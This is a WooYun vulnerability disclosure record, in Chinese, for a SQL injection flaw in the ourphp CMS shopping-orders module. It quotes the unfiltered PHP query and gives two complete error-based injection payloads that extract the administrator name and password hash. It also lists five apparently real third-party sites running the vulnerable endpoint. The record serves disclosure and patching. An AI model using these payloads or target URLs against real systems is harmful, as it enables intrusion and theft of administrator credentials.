{"id": 37375, "wybug_id": "wooyun-2015-099831", "wybug_title": "傲派建站系统(ourphp cms)sql注射漏洞(官网demo演示)", "wybug_corp": "ourphp.net", "wybug_author": "iori", "wybug_date": "2015-04-14 11:01", "wybug_open_date": "2015-07-13 11:08", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "7", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "源码分析"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-14：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-14：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-04-17：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-06-08：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-18：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-28：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-07-13：\t细节向公众公开  简要描述： rt 详细说明：  漏洞出现在function/ourphp_shoppingorders.class.php\n}elseif ($_GET[\"ourphp_cms\"] == \"buyok\"){\tif (!empty($_POST[\"id\"])){\t$id = implode(',',$_POST[\"id\"]);\t}else{\t$id = 0;\t}\t\tif ($id == 0){\texit(\"no!\");\t}\t$query = $db-> sqllist(\"select `OP_Ordersnum`,`OP_Ordersusermarket`,`OP_Ordersfreight`,`OP_Ordersid`,`OP_Ordersproductatt` from `ourphp_orders` where `id` in (\".$id.\")\");\nPOST数组id没有任何过滤，就拼接成字符串带入查询。   漏洞证明：  上官网demohttp://demo.ourphp.net先随便注册一个用户\n\n暴管理员用户名post如下代码提交给http://demo.ourphp.net/?cn-shoppingorders.html-&ourphp_cms=buyok\nid[0]=1) AND (SELECT 1 FROM(SELECT count(*),CONCAT(0x7c,(SELECT MID(OP_Adminname,1,50) FROM ourphp_admin ORDER BY OP_Adminname LIMIT 0,1),0x7c,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND (1=1&shoppingname=lx&shoppingtel=13422114456&shoppingadd=asdf&Submit=%E6%94%B6%E9%93%B6%E5%8F%B0%E7%BB%93%E7%AE%97\n\n\n用户名outphp暴管理员口令hash\nid[0]=1) AND (SELECT 1 FROM(SELECT count(*),CONCAT(0x7c,(SELECT MID(OP_Adminpass,1,50) FROM ourphp_admin ORDER BY OP_Adminname LIMIT 0,1),0x7c,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND (1=1&shoppingname=lx&shoppingtel=13422114456&shoppingadd=asdf&Submit=%E6%94%B6%E9%93%B6%E5%8F%B0%E7%BB%93%E7%AE%97\n\n\n2015年2月~3月才出的1.0和1.1版本的cms。找5个实例本屌还是费老劲了，还都是未完善的网站。1.http://www.xqita.com/?cn-shoppingorders.html-&ourphp_cms=buyok\n\n2.http://www.itouxiao.net/?cn-shoppingorders.html-&ourphp_cms=buyok\n\n3.http://arrowlove.com/?cn-shoppingorders.html-&ourphp_cms=buyok\n\n4.http://42078.vhost54.boxcdn.cn/?cn-shoppingorders.html-&ourphp_cms=buyok\n\n5.http://hyqhhg.com/?cn-shoppingorders.html-&ourphp_cms=buyok\n\n   修复方案：  过滤id   版权声明：转载请注明来源 iori@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-04-14 11:06 厂商回复： 我们在V1.2会修复. 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}